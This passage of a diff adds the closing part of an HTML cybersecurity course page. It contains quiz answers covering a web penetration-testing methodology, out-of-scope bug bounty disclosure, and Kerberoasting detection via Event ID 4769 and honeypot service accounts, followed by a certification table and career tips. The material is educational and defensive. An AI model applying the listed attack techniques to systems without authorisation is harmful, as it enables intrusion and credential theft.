+  <div class="quiz-a">1. <strong>Recon</strong>: Technology fingerprinting (Wappalyzer, whatweb), directory fuzzing (gobuster), subdomain enum, checking robots.txt, /sitemap.xml, JS files for API endpoints and secrets.<br>2. <strong>Map attack surface</strong>: Every input field, every parameter, every file upload, every API endpoint. Use Burp's spider + manual browsing.<br>3. <strong>Authentication testing</strong>: Default credentials, brute force protection, password reset flaws, session cookie entropy and HttpOnly/Secure flags.<br>4. <strong>Injection testing</strong>: SQLi, XSS, SSTI, XXE, command injection on every input. Use Burp Repeater for manual testing, then SQLmap for confirmed SQL injection.<br>5. <strong>Access control</strong>: IDOR (change IDs), horizontal/vertical privilege escalation, JWT tampering, CORS misconfigs.<br>6. <strong>Business logic</strong>: Race conditions (two requests simultaneously), negative values in quantities, skipping payment steps.<br>7. <strong>Report</strong>: CVSS-scored findings, PoC for each, remediation guidance. Prioritise by impact × exploitability.</div>
+
+  <div class="quiz-q" style="margin-top:1.25rem">Q5: During a bug bounty hunt you find a critical vulnerability that's out of scope. What do you do?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Model Answer</button>
+  <div class="quiz-a">Stop exploiting immediately — the moment you confirm it's out-of-scope, any further testing is potentially unauthorised access under CFAA/CMA regardless of your intent. Then: (1) Report it to the security team through their disclosure contact anyway — out-of-scope means "don't hunt here" not "we don't care about vulnerabilities here". (2) Document exactly what you found and what minimal steps confirmed the issue. (3) Include it in a professional note with the in-scope report. Many programs will reward good-faith out-of-scope disclosures with kudos or even payment. Never weaponise an out-of-scope finding or sit on it.</div>
+
+  <div class="quiz-q" style="margin-top:1.25rem">Q6: Explain how you would detect a Kerberoasting attack in an Active Directory environment.</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Model Answer</button>
+  <div class="quiz-a">Kerberoasting requests TGS tickets for Service Principal Names. Detection indicators: (1) <strong>Event ID 4769</strong> in Windows Security log — "Kerberos Service Ticket Request" with encryption type 0x17 (RC4-HMAC, which is used specifically because it's faster to crack than AES). (2) <strong>Unusual volume</strong>: one user requesting TGS tickets for many different SPNs in a short period. (3) <strong>Honeypot SPNs</strong>: register fake service accounts with attractive names (e.g. SQLServiceAdmin) that are never legitimately used — any TGS request for them is definitively malicious. Detection tools: Microsoft Defender for Identity has built-in Kerberoasting detection, Splunk queries on 4769 with 0x17 cipher.</div>
+</div>
+
+<div class="sec"><h2>Certification Roadmap — Real Cost & Time</h2></div>
+<table class="tbl">
+<tr><th>Cert</th><th>Cost</th><th>Study Time</th><th>Format</th><th>Value</th></tr>
+<tr><td>CompTIA Security+</td><td>~$400</td><td>60-90 hours</td><td>MCQ exam</td><td>Entry-level job requirement, HR-friendly</td></tr>
+<tr><td>eJPT (eLearnSecurity)</td><td>~$200</td><td>40-60 hours</td><td>Practical lab exam</td><td>First practical cert — proves hands-on ability</td></tr>
+<tr><td>CEH</td><td>~$1000+</td><td>100+ hours</td><td>MCQ exam</td><td>Recognised by large enterprises, government</td></tr>
+<tr><td>OSCP (OffSec)</td><td>~$1500</td><td>300-600 hours</td><td>24hr lab exam</td><td>Gold standard — root 5 machines in 24 hours</td></tr>
+</table>
+<div class="callout success"><div class="callout-title">✅ Portfolio Strategy</div>
+1. <strong>CTF writeups</strong>: Document every HTB/THM machine you root. Blog format. Show your thinking.<br>
+2. <strong>GitHub</strong>: Push your scripts (port scanner, recon tools). Recruiters look here.<br>
+3. <strong>Bug bounty reports</strong>: Even P4/P5 findings show you do real hunting.<br>
+4. <strong>THM/HTB profiles</strong>: Public leaderboard rankings are visible to employers.<br>
+5. <strong>LinkedIn</strong>: Add certs as they come. Connect with security professionals.
+</div>
+<div class="ch-nav"><div class="nav-btn" onclick="show('ch17')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 17 — Bug Bounty</div></div><div class="nav-btn next" onclick="show('ch-home')" style="background:var(--gdim);border-color:rgba(0,255,136,.3)"><div class="nav-dir" style="color:var(--green)">Complete ✓</div><div class="nav-name" style="color:var(--green)">Back to Home</div></div></div>
+</div>
+
+</main>
+
+<script>
+function show(id) {
+  document.querySelectorAll('.chapter').forEach(c => c.classList.remove('active'));
+  document.querySelectorAll('.sb-link').forEach(l => l.classList.remove('active'));
+  const chapter = document.getElementById(id);
+  if (chapter) {
+    chapter.classList.add('active');
+    document.getElementById('main').scrollTo(0, 0);
+  }
+  const navLink = document.getElementById('nav-' + id);
+  if (navLink) navLink.classList.add('active');
+}
+
+function toggleQuiz(btn) {
+  const answer = btn.nextElementSibling;
+  const isOpen = answer.style.display === 'block';
+  answer.style.display = isOpen ? 'none' : 'block';
+  btn.textContent = isOpen ? 'Reveal Answer' : 'Hide Answer';
+}
+
+// Set home as active on load
+show('ch-home');
+</script>
+</body>
+</html>
